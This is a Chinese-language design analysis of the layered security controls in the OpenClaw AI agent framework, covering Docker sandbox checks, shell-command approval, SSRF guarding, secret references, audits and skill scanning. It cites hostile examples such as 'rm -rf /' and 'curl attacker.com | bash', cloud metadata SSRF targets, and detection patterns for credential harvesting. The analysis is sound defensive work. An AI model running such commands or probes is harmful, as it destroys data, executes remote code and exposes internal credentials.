# 维度名：安全防护（Security Protection）

## 1. 一句话定位

OpenClaw 的安全防护维度是一个**纵深防御体系**，通过沙箱隔离、执行审批、SSRF 防护、密钥管理和安全审计五条防线，防止 AI Agent 在自主执行过程中对宿主系统、网络边界和敏感数据造成不可逆损害。

---

## 2. 为什么需要（设计动机）

### 2.1 没有这个机制会怎样？

如果没有安全防护体系，OpenClaw 作为 AI Agent 框架将面临多重灾难性风险：

- **宿主系统被完全接管**：`exec` 工具默认可以执行任意 shell 命令。如果没有沙箱隔离和执行审批，LLM 生成的 `rm -rf /` 或 `curl attacker.com | bash` 会直接运行在网关主机上，导致数据丢失或远程代码执行（`src/infra/exec-approvals.ts:L484-496`）。
- **内网横向渗透**：`web_fetch` 工具如果没有 SSRF 防护，LLM 可以被诱导访问 `http://localhost:8080/admin` 或 `http://169.254.169.254/latest/meta-data/`（AWS 元数据服务），从而窃取内部服务凭证或云实例权限（`src/infra/net/ssrf.ts:L40-44`）。
- **密钥大规模泄露**：配置文件 `openclaw.json` 中可能明文存储 API Key、Gateway Token 等敏感信息。如果没有密钥审计和 SecretRef 抽象，配置文件一旦被提交到 Git 或泄露，所有关联服务（LLM 提供商、Telegram、Discord）的凭证将全部暴露（`src/secrets/audit.ts:L39-70`）。
- **恶意 Skill 代码执行**：OpenClaw 支持动态加载 Skill（插件）。如果没有 Skill 代码扫描，攻击者可以通过 Skill 注入 `child_process.exec` 或 `eval`，在 Agent 运行时执行恶意代码（`src/security/skill-scanner.ts:L147-205`）。
- **沙箱逃逸**：Docker 沙箱如果允许挂载 `/proc`、`/sys` 或 Docker Socket，容器内进程可以突破隔离边界，直接控制宿主机（`src/agents/sandbox/validate-sandbox-security.ts:L16-33`）。

### 2.2 OpenClaw 的具体触发条件

安全防护不是始终全量运行的，而是在关键决策点被显式触发：

- **沙箱安全验证**：当创建 Docker 容器时，`buildSandboxCreateArgs` 会调用 `validateSandboxSecurity`，检查 bind mounts、network mode、seccomp/apparmor 配置（`src/agents/sandbox/docker.ts:L331-344`）。
- **执行审批触发**：当 `security=allowlist` 且命令不匹配 allowlist，或 `ask=always` 时，`requiresExecApproval` 返回 true，触发用户审批流程（`src/infra/exec-approvals.ts:L484-496`）。
- **SSRF 拦截**：每次 `fetchWithSsrFGuard` 发起 HTTP 请求前，都会通过 `resolvePinnedHostnameWithPolicy` 进行 DNS 解析和 IP 地址双重检查（`src/infra/net/fetch-guard.ts:L190-193`）。
- **安全审计触发**：用户运行 `openclaw security audit --deep` 时，`runSecurityAudit` 会遍历配置、文件系统、网关探活等数十项检查（`src/security/audit.ts:L1131-1253`）。
- **密钥审计触发**：用户运行 `openclaw secrets audit` 时，`runSecretsAudit` 扫描配置文件、auth store、models.json 和 .env 文件中的明文密钥（`src/secrets/audit.ts:L601-683`）。

---

## 3. 核心设计思路

### 3.1 抽象模型

OpenClaw 的安全防护可以抽象为一个**五层过滤管道**：

```
[外部输入/LLM决策] 
    |
    v
[Layer 1: 静态审计]      -- 配置检查、代码扫描、密钥审计
    |
    v
[Layer 2: 执行审批]      -- 命令分析、allowlist/safeBins匹配、用户确认
    |
    v
[Layer 3: 沙箱隔离]      -- Docker容器、bind mount限制、网络隔离
    |
    v
[Layer 4: 网络防护]      -- SSRF拦截、DNS固定、重定向追踪
    |
    v
[Layer 5: 密钥管理]      -- SecretRef抽象、多源解析、权限校验
    |
    v
[受控执行环境]
```

每一层都是独立可替换的模块，但层与层之间存在**策略一致性约束**（例如 exec-approvals 的 safeBins 需要与 sandbox 的 workspace mounts 对齐）。

### 3.2 关键设计决策

| 决策 | 选择 | 放弃的替代方案 | 从代码中看到的理由 |
|------|------|--------------|------------------|
| 沙箱默认策略 | Docker 容器 + 受限 bind mounts + 非 host 网络 | 直接依赖 Linux namespace/cgroup 或 Firecracker | `docker.ts` 中直接使用 `docker` CLI 创建容器（`L67-163`），利用现有 Docker 生态，降低运维复杂度；同时通过 `validateSandboxSecurity`（`validate-sandbox-security.ts:L328-343`）阻止危险配置 |
| 执行审批模型 | 三级安全（deny / allowlist / full）+ 三级询问（off / on-miss / always） | 简单的布尔开关（允许/拒绝） | `exec-approvals.ts:L10-13` 定义了 `ExecSecurity` 和 `ExecAsk` 两个独立维度，允许用户配置"allowlist 匹配时自动通过，不匹配时询问"的精细化策略 |
| SSRF 防护策略 | DNS 解析前拦截 + 解析后二次验证 + hostname allowlist | 仅依赖 IP 黑名单或仅依赖 DNS 过滤 | `ssrf.ts:L276-323` 的 `resolvePinnedHostnameWithPolicy` 先检查 hostname 是否被阻塞，再解析 DNS，最后验证解析结果是否指向私有 IP，防止 DNS Rebinding 攻击 |
| 密钥存储抽象 | SecretRef 引用（env/file/exec 三源） | 直接加密存储或纯环境变量 | `secrets/resolve.ts:L834-916` 支持从环境变量、文件、外部命令三种来源解析密钥，配置中只保留引用，实现"配置与密钥分离" |
| 安全审计架构 | 配置检查（sync）+ 文件系统检查（async）+ 深度网关探活 | 仅静态代码扫描 | `audit.ts:L1131-1253` 将审计分为 `collectGatewayConfigFindings`、`collectFilesystemFindings`、`maybeProbeGateway` 三个阶段，覆盖配置、文件系统和运行时三个层面 |

### 3.3 数据流/控制流

以一次 `exec` 工具调用为例：

```
1. LLM 生成命令字符串
   |
2. analyzeShellCommand (exec-approvals-analysis.ts:L756-797)
   |-- 解析 shell 命令为 segments，拒绝 heredoc、$()、反引号等危险语法
   |
3. evaluateShellAllowlist (exec-approvals-allowlist.ts:L530-609)
   |-- 检查 allowlist / safeBins / skills 三重匹配
   |
4. requiresExecApproval (exec-approvals.ts:L484-496)
   |-- 若 security=allowlist 且未匹配，或 ask=always，则触发审批
   |
5. requestExecApprovalViaSocket (exec-approvals.ts:L559-589)
   |-- 通过 Unix Domain Socket 向 CLI/Gateway 发送审批请求，等待用户决策
   |
6. 若审批通过，根据 execHost 选择执行环境：
   - sandbox: ensureSandboxContainer (docker.ts:L492-567) -> execDockerRaw
   - gateway/node: 直接在主机执行（受 safeBins / allowlist 约束）
```

---

## 4. 关键机制拆解（含源码）

### 机制 A：Docker 沙箱安全验证

**作用**：在创建容器前拦截危险的 Docker 配置，防止沙箱逃逸和权限提升。

**设计意图**：不依赖用户"知道自己在做什么"，而是在运行时强制校验所有 bind mounts、网络模式和 seccomp/apparmor 配置。为什么放在 `buildSandboxCreateArgs` 中而不是配置加载时？因为配置可能被动态修改，运行时校验是最后一道防线。

**关键源码**（`src/agents/sandbox/validate-sandbox-security.ts:96-117`）：
```typescript
export function getBlockedBindReason(bind: string): BlockedBindReason | null {
  const sourceRaw = parseBindSourcePath(bind);
  if (!sourceRaw.startsWith("/")) {
    return { kind: "non_absolute", sourcePath: sourceRaw };
  }

  const normalized = normalizeHostPath(sourceRaw);
  return getBlockedReasonForSourcePath(normalized);
}

export function getBlockedReasonForSourcePath(sourceNormalized: string): BlockedBindReason | null {
  if (sourceNormalized === "/") {
    return { kind: "covers", blockedPath: "/" };
  }
  for (const blocked of BLOCKED_HOST_PATHS) {
    if (sourceNormalized === blocked || sourceNormalized.startsWith(blocked + "/")) {
      return { kind: "targets", blockedPath: blocked };
    }
  }
  return null;
}
```
这段代码的精妙之处在于**纯字符串校验 + 符号链接二次校验**的双重策略：先通过字符串匹配快速拒绝 `/etc`、`/proc`、`/var/run/docker.sock` 等危险路径（`L16-33`）；再通过 `resolveSandboxHostPathViaExistingAncestor` 解析符号链接后的真实路径，重新校验（`L273-279`），防止 `mount /safe/path -> /etc` 的符号链接绕过。

---

### 机制 B：执行审批与命令分析

**作用**：将 LLM 生成的 shell 命令解析为结构化 segments，通过 allowlist、safeBins、skills 三重机制决定是否允许执行，并在必要时请求用户确认。

**设计意图**：为什么不直接拦截所有 shell 命令？因为 Agent 的核心价值就是自动执行。OpenClaw 的妥协是：**允许执行，但必须在受控范围内**。`analyzeShellCommand` 不是简单的正则匹配，而是完整的 shell 词法分析器，能够识别管道、引号、转义和链式操作符。

**关键源码**（`src/infra/exec-approvals-analysis.ts:73-346`）：
```typescript
function splitShellPipeline(command: string): { ok: boolean; reason?: string; segments: string[] } {
  // ... 完整的 shell 词法分析器，处理单引号、双引号、转义、heredoc ...
  for (let i = 0; i < command.length; i += 1) {
    const ch = command[i];
    // 拒绝 $() 命令替换
    if (ch === "$" && next === "(") {
      return { ok: false, reason: "unsupported shell token: $()", segments: [] };
    }
    // 拒绝反引号
    if (ch === "`") {
      return { ok: false, reason: "unsupported shell token: `", segments: [] };
    }
    // 拒绝 heredoc 中的命令替换
    if (!current.quoted && hasUnquotedHeredocExpansionToken(heredocLine)) {
      return { ok: false, reason: "command substitution in unquoted heredoc", segments: [] };
    }
    // ...
  }
}
```
这段代码值得看的原因是：它**主动放弃支持完整的 shell 语法**，只支持最安全的子集。heredoc、`$()`、反引号、`<()` 等都被显式拒绝。这不是因为实现困难，而是因为**任何支持这些语法的系统都无法在静态分析时确定命令的真实行为**。

---

### 机制 C：SSRF 防护与 DNS 固定

**作用**：防止 LLM 通过 `web_fetch` 等工具访问内部网络服务（localhost、私有 IP、云元数据服务）。

**设计意图**：SSRF 攻击的核心是"DNS Rebinding"——先用一个合法的公网域名通过 hostname 检查，然后 DNS 解析返回一个私有 IP。OpenClaw 的解决方案是**DNS 固定（DNS Pinning）**：在第一次解析后，将域名和 IP 地址绑定，后续所有请求都通过自定义的 `lookup` 函数返回固定的 IP，彻底杜绝 Rebinding。

**关键源码**（`src/infra/net/ssrf.ts:276-323`）：
```typescript
export async function resolvePinnedHostnameWithPolicy(
  hostname: string,
  params: { lookupFn?: LookupFn; policy?: SsrFPolicy } = {},
): Promise<PinnedHostname> {
  const normalized = normalizeHostname(hostname);
  const allowPrivateNetwork = isPrivateNetworkAllowedByPolicy(params.policy);
  // Phase 1: fail fast for literal hosts/IPs before any DNS lookup side-effects.
  if (!skipPrivateNetworkChecks) {
    assertAllowedHostOrIpOrThrow(normalized, params.policy);
  }

  const lookupFn = params.lookupFn ?? dnsLookup;
  const results = await lookupFn(normalized, { all: true });

  if (!skipPrivateNetworkChecks) {
    // Phase 2: re-check DNS answers so public hostnames cannot pivot to private targets.
    assertAllowedResolvedAddressesOrThrow(results, params.policy);
  }

  const addresses = dedupeAndPreferIpv4(results);
  return {
    hostname: normalized,
    addresses,
    lookup: createPinnedLookup({ hostname: normalized, addresses }),
  };
}
```
这里的关键是**Phase 1 和 Phase 2 的双重检查**：Phase 1 在 DNS 前拦截字面量（如 `127.0.0.1`、`localhost`）；Phase 2 在 DNS 后拦截解析结果（如 `evil.com -> 10.0.0.1`）。`createPinnedLookup` 创建的自定义 lookup 函数会固化解析结果，防止后续请求被重定向到不同 IP。

---

### 机制 D：密钥管理与 SecretRef 解析

**作用**：将敏感信息从配置文件中抽离，通过引用（Ref）在运行时从环境变量、文件或外部命令安全获取。

**设计意图**：配置文件（`openclaw.json`）是用户最常编辑的文件，也是最容易被意外提交到 Git 的文件。OpenClaw 通过 `SecretRef` 抽象，让配置中只保留 `"$ref": {...}` 引用，实际值在运行时解析。这不仅防止泄露，还支持密钥轮换（只需更新环境变量，无需修改配置）。

**关键源码**（`src/secrets/resolve.ts:834-916`）：
```typescript
export async function resolveSecretRefValues(
  refs: SecretRef[],
  options: ResolveSecretRefOptions,
): Promise<Map<string, unknown>> {
  const limits = resolveResolutionLimits(options.config);
  // 去重：同一 ref 只解析一次
  const uniqueRefs = new Map<string, SecretRef>();
  for (const ref of refs) {
    uniqueRefs.set(secretRefKey(ref), { ...ref, id });
  }

  // 按 provider 分组批量解析
  const grouped = new Map<string, { source: SecretRefSource; providerName: string; refs: SecretRef[] }>();
  // ...

  const taskResults = await runTasksWithConcurrency({
    tasks,
    limit: limits.maxProviderConcurrency,
    errorMode: "stop",
  });
  // ...
}
```
这段代码的设计亮点是**批量解析 + 并发控制 + 缓存**：通过 `uniqueRefs` 去重避免重复解析；通过 `runTasksWithConcurrency` 限制并发（默认 4），防止对外部密钥服务造成压力；通过 `SecretRefResolveCache` 缓存解析结果，在一次请求生命周期内多次使用同一密钥时只需解析一次。

---

### 机制 E：安全审计（Security Audit）

**作用**：对 OpenClaw 的运行时配置、文件系统权限、网关暴露面进行全面扫描，发现潜在的安全隐患。

**设计意图**：安全防护不能只是"防御性"的，还需要"检测性"的。安全审计模块将数十项检查聚合为一份结构化报告，帮助用户发现配置错误（如 Gateway 绑定到 0.0.0.0 但没有认证）、权限过宽（如 state 目录 world-writable）、密钥泄露（如 models.json 中明文 API Key）等问题。

**关键源码**（`src/security/audit.ts:339-427`）：
```typescript
function collectGatewayConfigFindings(cfg: OpenClawConfig, env: NodeJS.ProcessEnv): SecurityAuditFinding[] {
  const findings: SecurityAuditFinding[] = [];
  // HTTP /tools/invoke 默认禁用 session orchestration 工具
  const reenabledOverHttp = DEFAULT_GATEWAY_HTTP_TOOL_DENY.filter((name) =>
    gatewayToolsAllow.has(name),
  );
  if (reenabledOverHttp.length > 0) {
    const extraRisk = bind !== "loopback" || tailscaleMode === "funnel";
    findings.push({
      checkId: "gateway.tools_invoke_http.dangerous_allow",
      severity: extraRisk ? "critical" : "warn",
      title: "Gateway HTTP /tools/invoke re-enables dangerous tools",
      detail: `gateway.tools.allow includes ${reenabledOverHttp.join(", ")}...`,
      remediation: "Remove these entries from gateway.tools.allow...",
    });
  }
  // Gateway 绑定到非 loopback 但没有认证
  if (bind !== "loopback" && !hasSharedSecret && auth.mode !== "trusted-proxy") {
    findings.push({
      checkId: "gateway.bind_no_auth",
      severity: "critical",
      title: "Gateway binds beyond loopback without auth",
    });
  }
  // ... 数十项类似检查
}
```
这段代码体现了**"默认拒绝，显式允许"**的安全哲学：`DEFAULT_GATEWAY_HTTP_TOOL_DENY`（`dangerous-tools.ts:L9-20`）定义了默认禁用的危险工具列表，如果用户显式在配置中重新启用，审计会发出 `critical` 级别警告。这种设计让"不安全的选择"变得**显式且可追踪**。

---

### 机制 F：Skill 代码安全扫描

**作用**：在加载 Skill 前扫描其源代码，检测潜在的恶意行为（如 `child_process.exec`、`eval`、环境变量窃取、数据外泄）。

**设计意图**：Skill 是 OpenClaw 的扩展机制，允许社区贡献代码。但 Skill 代码在 Agent 进程中运行，具有与主进程相同的权限。OpenClaw 的妥协是：**允许加载 Skill，但先扫描其代码**，发现 critical 级别发现时阻止加载或发出警告。

**关键源码**（`src/security/skill-scanner.ts:147-205`）：
```typescript
const LINE_RULES: LineRule[] = [
  {
    ruleId: "dangerous-exec",
    severity: "critical",
    message: "Shell command execution detected (child_process)",
    pattern: /\b(exec|execSync|spawn|spawnSync|execFile|execFileSync)\s*\(/,
    requiresContext: /child_process/,
  },
  {
    ruleId: "dynamic-code-execution",
    severity: "critical",
    message: "Dynamic code execution detected",
    pattern: /\beval\s*\(|new\s+Function\s*\(/,
  },
  {
    ruleId: "env-harvesting",
    severity: "critical",
    message: "Environment variable access combined with network send — possible credential harvesting",
    pattern: /process\.env/,
    requiresContext: /\bfetch\b|\bpost\b|http\.request/i,
  },
];
```
这里的设计亮点是**双模式规则**：`LINE_RULES` 按行匹配（快速定位具体代码行），`SOURCE_RULES` 按整个文件匹配（检测跨行的组合行为，如 `process.env + fetch`）。`requiresContext` 机制避免了误报——例如 `child_process` 相关函数只有在文件中同时出现 `child_process` 导入时才会触发。

---

### 机制 G：沙箱文件系统边界防护

**作用**：确保 Agent 通过沙箱进行的文件读写操作严格限制在允许的 mount 范围内，防止路径遍历和符号链接逃逸。

**设计意图**：沙箱内的文件操作通过 `fs-bridge` 代理到宿主机。即使容器本身有隔离，如果路径解析逻辑存在漏洞（如 `../etc/passwd` 或符号链接逃逸），Agent 仍然可能访问宿主机敏感文件。`SandboxFsPathGuard` 通过**双重路径解析**（词法 mount 匹配 + 容器内 canonical 路径解析）确保操作始终在边界内。

**关键源码**（`src/agents/sandbox/fs-bridge-path-safety.ts:118-135`）：
```typescript
private async openBoundaryWithinRequiredMount(
  target: SandboxResolvedFsPath,
  action: string,
  options?: { aliasPolicy?: PathAliasPolicy; allowedType?: SafeOpenSyncAllowedType },
): Promise<BoundaryFileOpenResult> {
  const lexicalMount = this.resolveRequiredMount(target.containerPath, action);
  const guarded = await openBoundaryFile({
    absolutePath: target.hostPath,
    rootPath: lexicalMount.hostRoot,
    boundaryLabel: "sandbox mount root",
    aliasPolicy: options?.aliasPolicy,
    allowedType: options?.allowedType,
  });
  return guarded;
}
```
`openBoundaryFile` 使用 `O_NOFOLLOW` 和路径规范化打开文件，防止符号链接逃逸。`resolveCanonicalContainerPath`（`L192-222`）通过在容器内执行 `readlink -f` 获取真实路径，再与 mount 边界比对，形成**宿主机边界 + 容器内边界**的双重保险。

---

## 5. 与其他维度的交互

```
[安全防护] --(沙箱容器配置)--> [沙箱系统]
[安全防护] --(允许/拒绝决策)--> [工具系统]
[安全防护] --(密钥解析值)--> [LLM调用 / 网关认证]
[安全防护] --(审计发现报告)--> [CLI/控制面板]
[安全防护] <--(执行命令字符串)-- [工具系统]
[安全防护] <--(配置快照)-- [配置系统]
[安全防护] <--(DNS解析请求)-- [网络层]
```

| 交互方向 | 维度 | 交互内容 | 代码中的交互点（函数/事件/表） |
|---------|------|---------|---------------------------|
| 输出到 | 沙箱系统 | 验证后的 Docker 创建参数 | `buildSandboxCreateArgs` -> `execDockerRaw` (`docker.ts:L317-427`) |
| 输出到 | 工具系统 | 执行审批决策（allow/deny） | `requiresExecApproval` -> `requestExecApprovalViaSocket` (`exec-approvals.ts:L484-589`) |
| 输出到 | LLM 调用 | 解析后的 API Key / Token | `resolveSecretRefValues` -> model provider headers (`secrets/resolve.ts:L834-916`) |
| 输出到 | 网关认证 | Gateway Token / Password | `resolveGatewayAuth` 消费 `cfg.gateway.auth` (`audit.ts:L347-397`) |
| 依赖 | 配置系统 | 安全配置项（sandbox、gateway、tools） | `runSecurityAudit` 读取 `OpenClawConfig` (`audit.ts:L1131-1135`) |
| 依赖 | 工具系统 | 待执行的 shell 命令字符串 | `evaluateShellAllowlist` 接收命令 (`exec-approvals-allowlist.ts:L530-609`) |
| 依赖 | 网络层 | DNS 解析结果 | `resolvePinnedHostnameWithPolicy` 调用 `dnsLookup` (`ssrf.ts:L300-301`) |
| 依赖 | 文件系统 | 配置文件、state 目录权限 | `collectFilesystemFindings` 调用 `inspectPathPermissions` (`audit.ts:L208-337`) |

---

## 6. 设计权衡与可借鉴之处

### 6.1 这个设计在代码中体现的假设

- **假设 1：用户会运行安全审计**。大量安全检查（如 `gateway.bind_no_auth`、`fs.state_dir.perms_world_writable`）只在审计时报告，不会阻止系统启动。作者假设用户会定期运行 `openclaw security audit` 并根据报告修复问题。
- **假设 2：Docker 是可信的**。沙箱隔离完全依赖 Docker 的容器化能力。如果 Docker 本身存在漏洞（如 runc 逃逸），OpenClaw 的防护将失效。
- **假设 3：执行审批的交互延迟是可接受的**。`requestExecApprovalViaSocket` 默认超时 15 秒（`exec-approvals.ts:L569`），在自动化场景（如 webhook 触发）中可能导致请求超时。
- **假设 4：Skill 代码扫描的误报率可控**。`skill-scanner.ts` 使用正则表达式匹配，可能将合法的 `child_process` 使用（如内部工具）标记为 critical。作者假设用户会人工审查扫描结果。

### 6.2 这个设计的代价/风险

- **沙箱启动延迟**：每次创建 Docker 容器需要拉取镜像、创建容器、执行 setupCommand，冷启动时间可能在数秒级别。`HOT_CONTAINER_WINDOW_MS = 5 * 60 * 1000`（`docker.ts:L178`）通过热容器复用缓解，但配置变更后仍需重建。
- **执行审批的 UX 摩擦**：`ask=on-miss` 模式下，任何不在 allowlist 的命令都会暂停执行并等待用户确认。对于高频自动化任务，这会导致体验劣化。代码中通过 `autoAllowSkills`（`exec-approvals.ts:L103`）部分缓解。
- **SSRF 防护的过度限制**：默认情况下，`localhost`、`*.local`、所有私有 IP 都被阻塞（`ssrf.ts:L40-44`）。如果用户需要访问本地服务（如本地开发的 API），必须显式配置 `hostnameAllowlist` 或 `dangerouslyAllowPrivateNetwork`。
- **密钥解析的故障模式**：如果 `SecretRef` 指向的外部命令或文件不可用，密钥解析会失败，导致 Agent 无法启动或 LLM 调用失败。`runSecretsAudit` 可以检测未解析的引用，但不会在运行时自动修复。

### 6.3 如果要重新设计，可能会改变什么

- **将安全审计从"可选报告"升级为"启动门禁"**：当前 `runSecurityAudit` 只是生成报告，不会阻止系统启动。可以考虑增加 `--security-hardened` 模式，发现 `critical` 级别问题时拒绝启动。
- **统一沙箱与执行审批的策略语言**：当前沙箱工具策略（`tool-policy.ts`）使用 glob 模式，而执行审批使用 allowlist 模式，两者语法不一致。统一为一套策略语言（如 OPA/Rego）可以降低用户认知负担。
- **引入 eBPF 或 seccomp-bpf 进行系统调用过滤**：当前沙箱依赖 Docker 的 `--security-opt no-new-privileges` 和 `--cap-drop`，但缺少细粒度的系统调用过滤。引入 seccomp-bpf 可以进一步限制容器内进程的能力。
- **执行审批支持异步通知（Webhook/Slack）**：当前审批只能通过 Unix Domain Socket 与本地 CLI 交互。对于远程部署，可以支持将审批请求推送到 Slack/Discord，用户通过回复消息进行决策。

### 6.4 对我自己设计 Agent 系统的启示

最核心的启示是：**AI Agent 的安全防护必须是"默认拒绝、显式允许"的纵深防御体系，而不是依赖 LLM 的"善良"或用户的"谨慎"**。OpenClaw 通过沙箱隔离（限制执行环境）、执行审批（限制执行权限）、SSRF 防护（限制网络访问）、密钥管理（限制数据暴露）四层防线，将"AI 可能作恶"的风险控制在可接受范围内。在设计自己的 Agent 系统时，应当从第一天就引入类似的防御分层，而不是在出现安全事件后补丁式地添加限制。
